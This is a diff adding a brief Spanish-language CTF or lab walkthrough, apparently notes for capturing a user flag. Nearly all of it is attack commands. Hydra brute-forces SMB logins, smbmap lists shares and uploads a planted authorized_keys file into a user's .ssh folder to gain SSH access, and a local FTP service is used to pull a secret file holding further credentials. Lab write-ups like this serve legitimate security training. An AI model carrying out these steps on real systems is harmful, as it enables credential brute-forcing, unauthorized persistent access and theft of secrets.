@@ -1,0 +1,22 @@
+User.txt
+
+Hydra al smb:
+hydra -L user.txt -P pass.txt IP smb
+
+Ver carpetas compartidas:
+smbmap -H IP -u user -p pass
+smbmap -H IP -u user -p pass -r folder
+
+Vemos k es el directorio de un usuario y podemos subir archivos.
+creamos un par de claves:
+ssh-keygen
+cat id_rsa.pub > authorized_keys
+smbmap -H IP-u "user" -p "pass" --upload authorized_keys folder/.ssh/authorized_keys
+y entramos por ssh:
+ssh -i id_rsa user@IP
+
+netstat -a 
+ftp
+open 127.0.0.1 
+get secret.txt
+y tenemos otras credenciales
